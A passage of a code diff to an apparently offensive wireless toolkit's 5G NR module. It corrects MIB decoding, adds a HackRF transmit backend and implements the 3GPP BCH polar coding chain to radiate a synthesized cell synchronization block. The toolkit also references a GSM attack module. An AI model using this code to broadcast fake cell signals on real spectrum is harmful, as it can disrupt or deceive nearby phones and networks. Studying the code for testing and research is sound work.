@@ -411,18 +411,36 @@ nair_sss_sequence() {
 }
 
 # ── MIB ─────────────────────────────────────────────────────────────────
-# TS 38.331 §6.2.2 BCCH-BCH-Message / TS 38.212 §7.1.1. The MIB is a fixed
-# 24-bit payload (BCCH-BCH-MessageType) delivered MSB-first; the ASN.1 field
-# order fixes the offsets:
-#     0..5    systemFrameNumber        6 bits  (the 4 MSBs of the 10-bit SFN)
-#     6       subCarrierSpacingCommon  1 bit   0 = 15 kHz, 1 = 30 kHz
-#     7..10   ssb-SubcarrierOffset     4 bits  k_SSB
-#     11      dmrs-TypeA-Position      1 bit   0 = pos2, 1 = pos3
-#     12..19  pdcch-ConfigSIB1         8 bits  CORESET#0 + search space
-#     20      cellBarred               1 bit
-#     21      intraFreqReselection     1 bit
-#     22      spare                    1 bit
-#     23      padding                  (the payload is 24 bits wide)
+# TS 38.331 §6.2.2 BCCH-BCH-Message / TS 38.212 §7.1.1. The message carried in
+# the PBCH is a BCCH-BCH-Message, a SEQUENCE holding a BCCH-BCH-MessageType
+# CHOICE. UPER encodes the CHOICE selector FIRST, so the 24 bits are:
+#     0       CHOICE selector           1 bit   0 = mib, 1 = messageClassExtension
+#     1..6    systemFrameNumber        6 bits  the 6 MSBs of the 10-bit SFN
+#     7       subCarrierSpacingCommon  1 bit   0 = scs15or60, 1 = scs30or120
+#     8..11   ssb-SubcarrierOffset     4 bits  k_SSB, MSB of k_SSB is in PBCH
+#     12      dmrs-TypeA-Position      1 bit   0 = pos2, 1 = pos3
+#     13..20  pdcch-ConfigSIB1         8 bits  controlResourceSetZero | searchSpaceZero
+#     21      cellBarred               1 bit   0 = barred, 1 = notBarred
+#     22      intraFreqReselection     1 bit   0 = allowed, 1 = notAllowed
+#     23      spare                    1 bit
+# That is 24 bits exactly — 1+6+1+4+1+8+1+1+1 — so there is NO padding bit.
+# A layout that starts systemFrameNumber at bit 0 has to invent one, and the
+# invented bit is what the missing CHOICE selector looks like.
+#
+# Two independent authorities fix this, not this module's own output:
+#   * py3gpp nrBCH.py — the TS 38.212 §7.1.1 interleaver takes SFN_PAYLOAD_BEGIN
+#     = 1, i.e. the six SFN bits start at message bit 1, so message bit 0 is the
+#     CHOICE selector.
+#   * Daniel Estevez decoded a real srsRAN NR PBCH recording with asn1tools
+#     against the TS 38.331 ASN.1 and finds the CHOICE bit first ("The first bit
+#     in the BCCH-BCH-Message UPER encoding thus indicates the message type, and
+#     the remaining 23 bits are the MIB"), with the interleaver taking the SFN
+#     from "bits 1 through 7 in the MIB".
+# The ENUMERATED fields take their UPER index from the order the items are
+# listed in TS 38.331 §6.2.2, so barred = 0 / notBarred = 1 and allowed = 0 /
+# notAllowed = 1. A real cell (srsRAN, Estevez's capture) decodes to notBarred
+# and notAllowed, i.e. both index bits 1; reading the bit as the value itself
+# inverts both fields and would call a normal cell "barred".
 nair_decode_mib() {
     local hex="${1:-}"
     hex="${hex//[[:space:]]/}"
@@ -438,20 +456,31 @@ nair_decode_mib() {
         echo $(( (val >> (24 - off - w)) & ((1 << w) - 1) ))
     }
 
+    local choice; choice=$(_nair_bit 0 1)
+    if (( choice != 0 )); then
+        # Selector 1 is messageClassExtension, an empty SEQUENCE: there is no
+        # systemFrameNumber in it. Reporting one would be decoding a different
+        # message as a MIB, so this is refused instead of guessed.
+        printf 'message_type\tmessageClassExtension\n'
+        printf 'ERROR\tBCCH-BCH-MessageType selector is 1 (messageClassExtension): the 24-bit payload is not a MIB, no systemFrameNumber exists to report\n' >&2
+        return 3
+    fi
+
     local sfn scs kssb dmrs sib1 barred intra spare
-    sfn=$(_nair_bit 0 6)
-    scs=$(_nair_bit 6 1)
-    kssb=$(_nair_bit 7 4)
-    dmrs=$(_nair_bit 11 1)
-    sib1=$(_nair_bit 12 8)
-    barred=$(_nair_bit 20 1)
-    intra=$(_nair_bit 21 1)
-    spare=$(_nair_bit 22 1)
+    sfn=$(_nair_bit 1 6)
+    scs=$(_nair_bit 7 1)
+    kssb=$(_nair_bit 8 4)
+    dmrs=$(_nair_bit 12 1)
+    sib1=$(_nair_bit 13 8)
+    barred=$(_nair_bit 21 1)
+    intra=$(_nair_bit 22 1)
+    spare=$(_nair_bit 23 1)
 
     local scs_val scs_name dmrs_name
     if (( scs == 0 )); then scs_val=15; scs_name="15kHz"; else scs_val=30; scs_name="30kHz"; fi
     if (( dmrs == 0 )); then dmrs_name="pos2"; else dmrs_name="pos3"; fi
 
+    printf 'message_type\tmib\n'
     printf 'sfn\t%s\n'                    "$sfn"
     printf 'subcarrier_spacing_common\t%s\n' "$scs_val"
     printf 'subcarrier_spacing_name\t%s\n'   "$scs_name"
@@ -460,8 +489,8 @@ nair_decode_mib() {
     printf 'pdcch_config_sib1\t%s\n'      "$sib1"
     printf 'pdcch_config_sib1_hi4\t%s\n'  "$(( sib1 >> 4 ))"
     printf 'pdcch_config_sib1_lo4\t%s\n'  "$(( sib1 & 0xF ))"
-    printf 'cell_barred\t%s\n'            "$([[ $barred -eq 1 ]] && echo barred || echo notBarred)"
-    printf 'intra_freq_reselection\t%s\n' "$([[ $intra -eq 1 ]] && echo allowed || echo notAllowed)"
+    printf 'cell_barred\t%s\n'            "$([[ $barred -eq 1 ]] && echo notBarred || echo barred)"
+    printf 'intra_freq_reselection\t%s\n' "$([[ $intra -eq 1 ]] && echo notAllowed || echo allowed)"
     printf 'spare\t%s\n'                  "$spare"
     # The bit string is built nibble by nibble: printf %024d would read the
     # binary digits as a decimal number and silently mangle anything above 2^63.
@@ -758,6 +787,15 @@ nair_sdr_probe_one() {
 #                            without owning one, and how an out-of-tree radio
 #                            is wired in.
 nair_probe_radio() {
+    # Set but empty means "there is no radio" — the same contract
+    # LAIR_SDR_DEVICE has in 10_lte_air.sh. `${VAR:-default}` cannot express
+    # it, because an empty value looks unset, so it is tested explicitly: a
+    # guard check needs a way to say "no device" that holds on a host which
+    # really has one.
+    if [[ -n "${NAIR_SDR_DEVICE+set}" && -z "${NAIR_SDR_DEVICE}" ]]; then
+        printf 'ERROR\tNAIR_SDR_DEVICE is set but empty: no SDR device is configured, nothing may be transmitted\n' >&2
+        return 2
+    fi
     if [[ -n "${NAIR_SDR_PROBE:-}" ]]; then
         local out
         out=$(timeout 6 bash -c "$NAIR_SDR_PROBE" 2>&1) || return 1
@@ -880,6 +918,117 @@ nair_arfcn_to_hz() {
     echo $(( khz * 1000 ))
 }
 
+# ── transmit backend — the SDR calls ────────────────────────────────────
+# Everything that keys a radio goes through here, so the one question that
+# matters — is a radio attached — is asked in exactly one place and answered by
+# hardware, never by the PATH. nair_find_sdr() above answers the different
+# question "which driver is installed", which is what --status legitimately
+# reports; it is not, and must not become, a licence to transmit.
+#
+# What this module transmits is baseband I/Q at the carrier's own sample rate
+# f_s = N_FFT * dF, and it never resamples: a radio that cannot run at f_s gets
+# a real error rather than a silently stretched waveform.
+#
+#   NAIR_TX_CMD='<shell>'  replace the built-in driver call with your own.
+#                          The IQ file is in $NAIR_TX_IQ, the rate in
+#                          $NAIR_TX_RATE, the centre frequency in
+#                          $NAIR_TX_FREQ_HZ and the gain in $NAIR_TX_GAIN.
+#                          This is how an out-of-tree radio is wired in, and
+#                          how a test says "a radio is attached" without
+#                          owning one (the test command writes to /dev/null,
+#                          so nothing is radiated).
+#   NAIR_TX_DRYRUN=1       build and verify the waveform, print every number,
+#                          then stop before the radio call with
+#                          `transmitted no`. Nothing is keyed.
+#   NAIR_TX_GAIN=<dB>      transmit gain; the default is 0, so raising it is a
+#                          deliberate act rather than a side effect.
+
+nair_tx_gain() {
+    local g="${NAIR_TX_GAIN:-0}"
+    [[ "$g" =~ ^-?[0-9]+$ ]] || {
+        printf 'ERROR\tNAIR_TX_GAIN must be an integer dB value\n' >&2; return 1; }
+    printf '%s' "$g"
+}
+
+# Which sample format a driver's own CLI reads. A wrong guess here radiates
+# noise instead of failing, so it is stated per driver and printed.
+nair_tx_iq_format() {
+    case "${1:-}" in
+        hackrf) printf 'cs8' ;;   # hackrf_transfer reads 8-bit signed I/Q
+        *)      printf 'c16' ;;
+    esac
+}
+
+# The file the driver can actually read, given the c16 the decoder verified.
+# Non-zero when that file is missing: falling back to the 16-bit file for a
+# driver that reads 8-bit would hand it garbage that still "works".
+nair_tx_iq_for() {
+    local type="${1:-}" iq="${2:-}" fmt
+    fmt=$(nair_tx_iq_format "$type")
+    case "$fmt" in
+        cs8) [[ -f "${iq%.c16}.cs8" ]] || return 1
+             printf '%s' "${iq%.c16}.cs8" ;;
+        *)   printf '%s' "$iq" ;;
+    esac
+}
+
+# The command line for a driver's own CLI, or non-zero when this module has no
+# verified call for that driver (then NAIR_TX_CMD is required). Only the hackrf
+# call is built in: hackrf_transfer's transmit syntax is the one already used
+# by this tree's GSM module (07_gsm_attack.sh), so it is the one that can be
+# checked on this host. No syntax is invented for drivers this host cannot
+# exercise — the operator supplies NAIR_TX_CMD for those, and the output says
+# so instead of printing a plausible-looking line nobody has ever run.
+nair_tx_call() {
+    local type="${1:-}" iq="${2:-}" rate="${3:-}" freq="${4:-}" gain="${5:-}"
+    [[ -n "$type" && -n "$iq" && -n "$rate" && -n "$freq" ]] || return 1
+    case "$type" in
+        hackrf)
+            # -t I/Q file, -f centre Hz, -s sample rate, -a 1 RF amp, -x TX VGA
+            printf 'hackrf_transfer -t %s -f %s -s %s -a 1 -x %s' \
+                   "$iq" "$freq" "$rate" "$gain" ;;
+        *) return 1 ;;
+    esac
+}
+
+# Key the radio. <type> <c16-file> <rate_hz> <freq_hz>. Prints sdr_call and
+# sdr_iq before running anything, and only returns 0 when the driver command
+# itself succeeded.
+nair_tx_run() {
+    local type="${1:-}" iq16="${2:-}" rate="${3:-}" freq="${4:-}"
+    local gain iq cmd rc=0
+    gain=$(nair_tx_gain) || return 2
+    iq=$(nair_tx_iq_for "$type" "$iq16") || {
+        printf 'ERROR\tno %s waveform next to %s — %s reads %s, not c16\n' \
+               "$(nair_tx_iq_format "$type")" "$iq16" "$type" \
+               "$(nair_tx_iq_format "$type")" >&2
+        return 1; }
+    export NAIR_TX_IQ="$iq" NAIR_TX_RATE="$rate" NAIR_TX_FREQ_HZ="$freq" \
+           NAIR_TX_GAIN="$gain"
+    if [[ -n "${NAIR_TX_CMD:-}" ]]; then
+        cmd="$NAIR_TX_CMD"
+        printf 'sdr_call\tshell: %s\n' "$(nair_sanitize "$cmd")"
+    else
+        cmd=$(nair_tx_call "$type" "$iq" "$rate" "$freq" "$gain") || {
+            printf 'ERROR\tno built-in transmit call for %s — set NAIR_TX_CMD\n' \
+                   "$type" >&2
+            return 3; }
+        printf 'sdr_call\t%s\n' "$(nair_sanitize "$cmd")"
+    fi
+    printf 'sdr_iq\t%s\n'       "$iq"
+    printf 'sdr_iq_format\t%s\n' "$(nair_tx_iq_format "$type")"
+    printf 'sdr_rate_hz\t%s\n'  "$rate"
+    printf 'sdr_centre_hz\t%s\n' "$freq"
+    printf 'sdr_gain_db\t%s\n'  "$gain"
+    timeout 120 bash -c "$cmd" >/dev/null 2>&1 || rc=$?
+    if (( rc != 0 )); then
+        printf 'ERROR\tSDR call failed (rc %s): %s\n' "$rc" \
+               "$(nair_sanitize "$cmd")" >&2
+        return 1
+    fi
+    return 0
+}
+
 # ── SSB baseband ────────────────────────────────────────────────────────
 # One NR SSB is four OFDM symbols in the middle 20 RBs of the carrier
 # (TS 38.211 §7.4.3.1):
@@ -906,6 +1055,8 @@ nair_arfcn_to_hz() {
 # waveform.
 NAIR_BB_PY="$MOD_TMP/nr_ssb_bb.py"
 NAIR_BB_DEC_PY="$MOD_TMP/nr_ssb_decode.py"
+NAIR_UL_PY="$MOD_TMP/nr_ul_gen.py"
+NAIR_UL_DEC_PY="$MOD_TMP/nr_ul_decode.py"
 
 # Write the baseband generator once. It is a heredoc rather than a tools/
 # script because it exists only to serve this module's transmit path, and the
@@ -922,14 +1073,26 @@ Emits one slot of int16 I/Q at the carrier's own sample rate f_s = dF * N_FFT
 (30.72 MHz for mu <= 2), with one SSB in the slot. Every constant is a spec
 constant or derived from one.
 
-Deliberately NOT implemented, and the TSV says so rather than implying
-otherwise: the PBCH polar code (TS 38.212 7.1) and PBCH bit scrambling. The
-PBCH REs therefore carry the MIB payload and its CRC24C directly, not a
-polar-encoded BCH transport block, and the receiver will not decode a BCH
-from them. PSS, SSS, the DMRS sequences, the DMRS placement, the OFDM
-numerology and the CP lengths ARE the spec's; PSS and SSS are additionally
-pinned chip-by-chip against an independent TS 38.211 implementation, because
-the module's own PSS/SSS table would agree with itself either way.
+The BCH chain of TS 38.212 7.1 is real and runs end to end: payload
+generation (7.1.1, the 24-bit MIB plus the 8 timing bits), payload scrambling
+(7.1.2), CRC24C (7.1.3), polar coding (7.1.4 with n_max = 9 and I_IL = 1, plus
+the pre-code interleaving of 5.3.1.1), rate matching (7.1.5 with E = 864, the
+sub-block interleaving of 5.4.1.1 and the repetition of 5.4.1.2) and the coded
+bit scrambling of TS 38.211 7.3.3.1. The polar sequence and the two
+permutation patterns are the spec's own tables, embedded as data and
+cross-checked against an independent implementation, and the resulting 864-bit
+codeword is pinned bit for bit against that implementation, because a chain
+compared only with itself agrees with itself when it is wrong. PSS, SSS, the
+DMRS sequences, the DMRS placement, the OFDM numerology and the CP lengths are
+likewise the spec's, with PSS and SSS pinned chip by chip.
+
+Scoped, and stated rather than implied: the scrambling sequence of 38.212
+7.1.2 is taken from the start of its 8-frame period — the clause anchors c(i)
+at each SFN with mod(SFN,8) = 0, and this module keys one SSB burst set, so
+nothing accumulates inside a period. i_SSB is 0 (one SSB is emitted), L_max is
+4 or 8 for FR1 and 64 for FR2; the 7.1.1 branches for L_max = 10, 20 and 64
+are implemented, but only the L_max = 4/8 and 64 branches are reachable from
+the bands this module carries.
 """
 import sys
 
@@ -937,7 +1100,16 @@ import numpy as np
 
 PSS_FORM = "TS 38.211 7.4.2.2.1"
 SSS_FORM = "TS 38.211 7.4.2.3.1"
-NFFT_STD = {15: 4096, 30: 4096, 60: 4096, 120: 8192, 240: 8192}
+# This file is written by nair_write_bb_gen, which only runs on the transmit
+# path, so a copy left in the temp directory can be older than the module.
+# Printing the marker makes a stale copy visible instead of silently
+# misleading whoever reads it.
+GEN_VERSION = "nair-ssb-gen/3 (BCH chain 38.212 7.1 + 38.211 7.3.3.1)"
+# The numerologies TS 38.211 4.2 defines. This is deliberately NOT an FFT
+# table: N_FFT arrives as an argument and is derived from the channel bandwidth
+# by nair_fft_size_for(), because a transcribed (SCS -> N_FFT) table is exactly
+# how this module's sample rate came to be 2.5x too high for a 20 MHz carrier.
+SCS_SUPPORTED = (15, 30, 60, 120, 240)
 
 # Pinned chips: the first 32 of d_PSS(N_ID(2)) for all three roots and of
 # d_SSS(N_ID(1), N_ID(2)) for three cell ids, taken from py3gpp 0.1.6 — an
@@ -970,6 +1142,91 @@ DMRS_PINNED = {
     13: "010110101010011100100100",
     42: "001001000101111100011000",
     1007: "000001111000010111101010",
+}
+# The BCH/PBCH coding chain's tables, TS 38.212. Table 5.3.1.2-1 is the polar
+# sequence Q_0^{Nmax-1} with Nmax = 1024 in ascending order of reliability: the
+# i-th entry is the i-th most reliable bit index. Only the entries below
+# N = 512 are carried, because 38.212 7.1.4 fixes n_max = 9 for the BCH and a
+# longer code cannot use the rest. The sequence is NOT derivable from a
+# polarisation weight formula (beta = 2^0.25, 2^0.5, 1.0 and 1.5 were each
+# tried against this table and each disagrees), so it is data: taken from the
+# specification and cross-checked, entry by entry, against an independent
+# implementation.
+POLAR_Q512 = [
+    0, 1, 2, 4, 8, 16, 32, 3, 5, 64, 9, 6, 17, 10, 18, 128,
+    12, 33, 65, 20, 256, 34, 24, 36, 7, 129, 66, 11, 40, 68, 130, 19,
+    13, 48, 14, 72, 257, 21, 132, 35, 258, 26, 80, 37, 25, 22, 136, 260,
+    264, 38, 96, 67, 41, 144, 28, 69, 42, 49, 74, 272, 160, 288, 192, 70,
+    44, 131, 81, 50, 73, 15, 320, 133, 52, 23, 134, 384, 76, 137, 82, 56,
+    27, 97, 39, 259, 84, 138, 145, 261, 29, 43, 98, 88, 140, 30, 146, 71,
+    262, 265, 161, 45, 100, 51, 148, 46, 75, 266, 273, 104, 162, 53, 193, 152,
+    77, 164, 268, 274, 54, 83, 57, 112, 135, 78, 289, 194, 85, 276, 58, 168,
+    139, 99, 86, 60, 280, 89, 290, 196, 141, 101, 147, 176, 142, 321, 31, 200,
+    90, 292, 322, 263, 149, 102, 105, 304, 296, 163, 92, 47, 267, 385, 324, 208,
+    386, 150, 153, 165, 106, 55, 328, 113, 154, 79, 269, 108, 224, 166, 195, 270,
+    275, 291, 59, 169, 114, 277, 156, 87, 197, 116, 170, 61, 281, 278, 177, 293,
+    388, 91, 198, 172, 120, 201, 336, 62, 282, 143, 103, 178, 294, 93, 202, 323,
+    392, 297, 107, 180, 151, 209, 284, 94, 204, 298, 400, 352, 325, 155, 210, 305,
+    300, 109, 184, 115, 167, 225, 326, 306, 157, 329, 110, 117, 212, 171, 330, 226,
+    387, 308, 216, 416, 271, 279, 158, 337, 118, 332, 389, 173, 121, 199, 179, 228,
+    338, 312, 390, 174, 393, 283, 122, 448, 353, 203, 63, 340, 394, 181, 295, 285,
+    232, 124, 205, 182, 286, 299, 354, 211, 401, 185, 396, 344, 240, 206, 95, 327,
+    402, 356, 307, 301, 417, 213, 186, 404, 227, 418, 302, 360, 111, 331, 214, 309,
+    188, 449, 217, 408, 229, 159, 420, 310, 333, 119, 339, 218, 368, 230, 391, 313,
+    450, 334, 233, 175, 123, 341, 220, 314, 424, 395, 355, 287, 183, 234, 125, 342,
+    316, 241, 345, 452, 397, 403, 207, 432, 357, 187, 236, 126, 242, 398, 346, 456,
+    358, 405, 303, 244, 189, 361, 215, 348, 419, 406, 464, 362, 409, 219, 311, 421,
+    410, 231, 248, 369, 190, 364, 335, 480, 315, 221, 370, 422, 425, 451, 235, 412,
+    343, 372, 317, 222, 426, 453, 237, 433, 347, 243, 454, 318, 376, 428, 238, 359,
+    457, 399, 434, 349, 245, 458, 363, 127, 191, 407, 436, 465, 246, 350, 460, 249,
+    411, 365, 440, 374, 423, 466, 250, 371, 481, 413, 366, 468, 429, 252, 373, 482,
+    427, 414, 223, 472, 455, 377, 435, 319, 484, 430, 488, 239, 378, 459, 437, 380,
+    461, 496, 351, 467, 438, 251, 462, 442, 441, 469, 247, 367, 253, 375, 444, 470,
+    483, 415, 485, 473, 474, 254, 379, 431, 489, 486, 476, 439, 490, 463, 381, 497,
+    492, 443, 382, 498, 445, 471, 500, 446, 475, 487, 504, 255, 477, 491, 478, 383,
+    493, 499, 502, 494, 501, 447, 505, 506, 479, 508, 495, 503, 507, 509, 510, 511,
+]
+# Table 5.3.1.1-1 with K_ILmax = 164: the information bit interleaving pattern
+# of 38.212 5.3.1.1, which 7.1.4 switches on for the BCH (I_IL = 1).
+POLAR_IL_MAX = [
+    0, 2, 4, 7, 9, 14, 19, 20, 24, 25, 26, 28, 31, 34, 42, 45, 49, 50, 51, 53,
+    54, 56, 58, 59, 61, 62, 65, 66, 67, 69, 70, 71, 72, 76, 77, 81, 82, 83, 87, 88,
+    89, 91, 93, 95, 98, 101, 104, 106, 108, 110, 111, 113, 115, 118, 119, 120, 122, 123, 126, 127,
+    129, 132, 134, 138, 139, 140, 1, 3, 5, 8, 10, 15, 21, 27, 29, 32, 35, 43, 46, 52,
+    55, 57, 60, 63, 68, 73, 78, 84, 90, 92, 94, 96, 99, 102, 105, 107, 109, 112, 114, 116,
+    121, 124, 128, 130, 133, 135, 141, 6, 11, 16, 22, 30, 33, 36, 44, 47, 64, 74, 79, 85,
+    97, 100, 103, 117, 125, 131, 136, 142, 12, 17, 23, 37, 48, 75, 80, 86, 137, 143, 13, 18,
+    38, 144, 39, 145, 40, 146, 41, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159,
+    160, 161, 162, 163,
+]
+# Table 7.1.1-1: the payload interleaver G(j) of 38.212 7.1.1. 0..5 take the
+# MIB's six systemFrameNumber bits, 6..9 the four SFN LSBs, 10 the half frame
+# bit, 11..13 the k_SSB MSB and the candidate SSB index bits, and 14..31 the
+# rest of the MIB in increasing bit order.
+PBCH_G = [16, 23, 18, 17, 8, 30, 10, 6, 24, 7, 0, 5, 3, 2, 1, 4,
+          9, 11, 12, 13, 14, 15, 19, 20, 21, 22, 25, 26, 27, 28, 29, 31]
+# Table 5.4.1.1-1: the sub-block interleaver pattern P(i) of 38.212 5.4.1.1.
+P_SUBBLOCK = [0, 1, 2, 4, 3, 5, 6, 7, 8, 16, 9, 17, 10, 18, 11, 19,
+              12, 20, 13, 21, 14, 22, 15, 23, 24, 25, 26, 28, 27, 29, 30, 31]
+
+# The whole chain pinned at its output for one vector: N_ID^cell = 42,
+# i_SSB = 0, L_max = 8, SFN = 37, a_HRF = 0, k_SSB MSB = 0 and the MIB of this
+# file's own payload builder (0x040000: the CHOICE selector 0 followed by the
+# SFN's six MSBs, 37 >> 4 = 2). "codeword" is the 864 rate-matched bits,
+# "scrambled" the same bits after the TS 38.211 7.3.3.1 scrambling with
+# nu = i_SSB = 0. Both come from an independent implementation of 38.212 7.1
+# and 38.211 7.3.3.1 — never from this file's output — and build_grid()
+# refuses to emit a waveform whose chain does not reproduce them.
+BCH_PINNED = {
+    "pci": 42, "i_ssb": 0, "l_max": 8, "sfn": 37, "hrf": 0, "kssb_msb": 0,
+    "codeword":
+    "ba9d68d6d0c476ae028f5b1a1cf73143865e1037abeac27cec077a6ec1b3a8254a6ddc049826f1b0"
+    "2034b65df27f9be92cf4014046ade0c76b19328c8a9e58d5ba9d68d6d0c476ae028f5b1a1cf731438"
+    "65e1037abeac27cec077a6ec1b3a8254a6ddc049826f1b02034b65d",
+    "scrambled":
+    "e08a233465c1f5e6fe1a6988e04a72c9b4080a80e07bfa6608d20ffd027962c9292bbde9ffc08a30"
+    "171b72d9a5ab87f9a9ee08992db1c441231f331bfada48821d6481b040813704e561a45d0de13218"
+    "76aac18fea950ba41ab3c91c28e648e2e26f2f72a8f4bb1606eab85a",
 }
 # What the pinned comparisons actually compared, filled in by build_grid(). A
 # printed "agree" line then reports a comparison that ran, never a literal.
@@ -1032,31 +1289,225 @@ def gold(c_init, length):
 
 def crc24c(bits):
     """TS 38.212 5.1: gCRC24C(D) = D^24+D^23+D^21+D^20+D^17+D^15+D^13+D^12
-    +D^8+D^4+D^2+D+1, attached MSB-first with the register preset to all
-    ones. This is the CRC BCH uses (38.212 7.1.1)."""
+    +D^8+D^4+D^2+D+1, the CRC BCH uses (38.212 7.1.3). The clause defines the
+    parity by the remainder of a0*D^(A+L-1) + ... + a_{A-1}*D^L + p0*D^(L-1)
+    + ... + p_{L-1} divided by g(D), which is the message bits shifted through
+    a register starting at ZERO; the register content after the last message
+    bit is the parity. Presetting the register to all ones, or feeding 24 extra
+    zeros, each gives a different 24-bit word — and because the generator and
+    the decoder used to share one wrong expression, their agreement could not
+    catch it (the pinned codeword does)."""
     poly = 0
     for e in (24, 23, 21, 20, 17, 15, 13, 12, 8, 4, 2, 1, 0):
         poly |= 1 << e
-    reg = 0xFFFFFF
-    for b in list(bits) + [0] * 24:
+    reg = 0
+    for b in bits:
         msb = (reg >> 23) & 1
-        reg = ((reg << 1) & 0xFFFFFF)
+        reg = (reg << 1) & 0xFFFFFF
         if msb ^ (b & 1):
             reg ^= poly
     return [(reg >> (23 - i)) & 1 for i in range(24)]
 
 
-def mib_payload(pci, sf):
-    """TS 38.212 7.1.1 BCH transport block -> 24 bits, from TS 38.331 6.2.2:
-    the 1-bit BCCH-BCH-MessageType CHOICE index (0 = mib) followed by the 23
-    ASN.1 MIB bits in field order — systemFrameNumber (6),
+def bits_to_hex(bits):
+    """MSB-first hex of a bit list, for a compact pinned comparison."""
+    s = "".join("1" if b else "0" for b in bits)
+    if len(s) % 4:
+        s = "0" * (-len(s) % 4) + s
+    return "%0*x" % (len(s) // 4, int(s, 2))
+
+
+def payload_generate(mib, sfn, hrf, l_max, kssb_msb, ssb_idx):
+    """TS 38.212 7.1.1: the 24-bit MIB plus the 8 timing related bits,
+    interleaved by Table 7.1.1-1. mib has bit 0 as MSB (the CHOICE selector,
+    0 = mib) and the six systemFrameNumber bits at 1..6, which is the layout
+    nair_decode_mib decodes. sfn is the full 10-bit SFN: its six MSBs are the
+    MIB field and its four LSBs are a_A..a_{A+3}."""
+    a = [0] * 32
+    for k in range(6):                      # the MIB's six SFN bits -> j 0..5
+        a[PBCH_G[k]] = mib[1 + k]
+    a[PBCH_G[6]] = (sfn >> 3) & 1           # 4th LSB of the SFN -> j = 6
+    a[PBCH_G[7]] = (sfn >> 2) & 1           # 3rd LSB            -> j = 7
+    a[PBCH_G[8]] = (sfn >> 1) & 1           # 2nd LSB            -> j = 8
+    a[PBCH_G[9]] = sfn & 1                  # 1st LSB            -> j = 9
+    a[PBCH_G[10]] = hrf & 1                 # the half frame bit -> j = 10
+    if l_max == 10:                         # a_{A+5}..a_{A+7}, 7.1.1
+        a[PBCH_G[11]] = kssb_msb & 1
+        a[PBCH_G[13]] = (ssb_idx >> 3) & 1
+    elif l_max == 20:
+        a[PBCH_G[11]] = kssb_msb & 1
+        a[PBCH_G[12]] = (ssb_idx >> 4) & 1
+        a[PBCH_G[13]] = (ssb_idx >> 3) & 1
+    elif l_max == 64:
+        a[PBCH_G[11]] = (ssb_idx >> 5) & 1
+        a[PBCH_G[12]] = (ssb_idx >> 4) & 1
+        a[PBCH_G[13]] = (ssb_idx >> 3) & 1
+    else:                                   # L_max = 4 or 8: a_{A+6}, a_{A+7}
+        a[PBCH_G[11]] = kssb_msb & 1        # are reserved (left as zeros)
+    j = 14
+    for i in range(24):                     # the rest of the MIB, increasing i
+        if 1 <= i <= 6:
+            continue
+        a[PBCH_G[j]] = mib[i]
+        j += 1
+    if j != 32:
+        raise SystemExit("ERROR\tthe PBCH payload interleaver placed %d of 32 "
+                         "bits" % j)
+    return a
+
+
+def payload_scramble(a, sfn, l_max, ncellid):
+    """TS 38.212 7.1.2. The bits of the candidate SS/PBCH block index, the
+    half frame bit and the 2nd and 3rd LSBs of the SFN are not scrambled; every
+    other bit i becomes a_i + c(j + v*M) mod 2, with M = A-3 for L_max = 4 or 8,
+    A-4 for 10, A-5 for 20 and A-6 for 64 — the exclusion count is exactly the
+    number of those SSB index bits plus three. v is Table 7.1.2-1 and the
+    sequence is initialised with N_ID^cell."""
+    m = {4: 29, 8: 29, 10: 28, 20: 27, 64: 26}[l_max]
+    v = 2 * ((sfn >> 2) & 1) + ((sfn >> 1) & 1)
+    excl = {PBCH_G[7], PBCH_G[8], PBCH_G[10]}
+    if l_max == 10:
+        excl.add(PBCH_G[13])
+    elif l_max == 20:
+        excl |= {PBCH_G[12], PBCH_G[13]}
+    elif l_max == 64:
+        excl |= {PBCH_G[11], PBCH_G[12], PBCH_G[13]}
+    c = gold(ncellid, (v + 1) * m)
+    out = list(a)
+    j = 0
+    for i in range(32):
+        if i in excl:
+            continue
+        out[i] = a[i] ^ int(c[j + v * m])
+        j += 1
+    if j != m:
+        raise SystemExit("ERROR\tPBCH payload scrambling covered %d bits, but "
+                         "M = %d for L_max = %d" % (j, m, l_max))
+    return out
+
+
+def polar_info_positions(k, n):
+    """TS 38.212 5.3.1.2 with 5.4.1.1: when E >= N there is no puncturing and
+    no shortening, so the information set Q_I^N is the k most reliable bit
+    indices below N, in the order the polar sequence lists them."""
+    qn = [q for q in POLAR_Q512 if q < n]
+    if k > len(qn):
+        raise SystemExit("ERROR\tpolar code K = %d does not fit N = %d" % (k, n))
+    return sorted(qn[len(qn) - k:])
+
+
+def polar_interleave(c, k):
+    """TS 38.212 5.3.1.1 with I_IL = 1, which 7.1.4 selects for the BCH:
+    c'_k = c_Pi(k), Pi built from Table 5.3.1.1-1 with K_ILmax = 164."""
+    off = 164 - k
+    out = [c[POLAR_IL_MAX[m] - off] for m in range(164)
+           if POLAR_IL_MAX[m] >= off]
+    if len(out) != k:
+        raise SystemExit("ERROR\tthe polar interleaver produced %d of %d bits"
+                         % (len(out), k))
+    return out
+
+
+def polar_encode(c, n):
+    """TS 38.212 5.3.1.2: u carries the interleaved bits on Q_I^N and d =
+    u * G_N with G_2 = [[1,0],[1,1]]. The Kronecker power is applied as the
+    n-stage butterfly that evaluates it over GF(2), not as a dense matrix."""
+    k = len(c)
+    cp = polar_interleave(c, k)
+    u = [0] * n
+    for idx, pos in enumerate(polar_info_positions(k, n)):
+        u[pos] = cp[idx]
+    half = 1
+    while half < n:
+        step = half << 1
+        for i in range(0, n, step):
+            for j in range(i, i + half):
+                u[j] ^= u[j + half]
+        half = step
+    return u
+
+
+def subblock_interleave(d):
+    """TS 38.212 5.4.1.1: y_n = d_J(n) with i = floor(32n/N) and
+    J(n) = P(i)*(N/32) + mod(n, N/32)."""
+    n = len(d)
+    if n % 32:
+        raise SystemExit("ERROR\tthe polar code length %d is not 32 sub-blocks"
+                         % n)
+    y = [0] * n
+    for k in range(n):
+        i = (32 * k) // n
+        y[k] = d[P_SUBBLOCK[i] * (n // 32) + (k % (n // 32))]
+    return y
+
+
+def rate_match(d, e, k):
+    """TS 38.212 5.4.1.2 bit selection from the circular buffer. With
+    E = 864 >= N = 512 Q_F^N,tmp is empty, so this is pure repetition."""
+    n = len(d)
+    y = subblock_interleave(d)
+    if e >= n:
+        return [y[i % n] for i in range(e)]
+    if k * 16 <= 7 * e:
+        return [y[i + n - e] for i in range(e)]
+    return [y[i] for i in range(e)]
+
+
+def bch_encode(mib, sfn, hrf, l_max, kssb_msb, ssb_idx, ncellid):
+    """TS 38.212 7.1 end to end: payload generation (7.1.1), scrambling
+    (7.1.2), CRC24C (7.1.3), polar coding with n_max = 9 and I_IL = 1 (7.1.4)
